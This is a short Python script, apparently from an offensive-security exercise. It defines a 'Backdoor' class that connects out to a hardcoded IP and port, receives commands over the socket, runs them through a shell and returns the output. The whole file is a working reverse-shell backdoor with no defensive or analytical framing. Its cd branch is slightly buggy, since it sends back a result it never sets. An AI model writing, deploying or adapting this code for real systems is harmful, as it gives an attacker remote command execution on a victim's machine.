#!/usr/bin/env python
import socket,json,os
import  subprocess

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send("\n[+] Connection Established\n")

    def execute_system_commands(self, command):
        return subprocess.check_output(command, shell=True)

    def send_reliable(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def receive_reliable(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except:
                continue
    def change_working_directory_to(self,path):
        os.chdir(path)
        return "[+] changing working directory to "+ path
    def run(self):
        while True:
            command = self.receive_reliable()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command)>1:
                self.change_working_directory_to(command[1])
            else:
                command_result = self.execute_system_commands(command)

            self.send_reliable(command_result)

backdoor = Backdoor("192.168.184.154",4460)
backdoor.run()
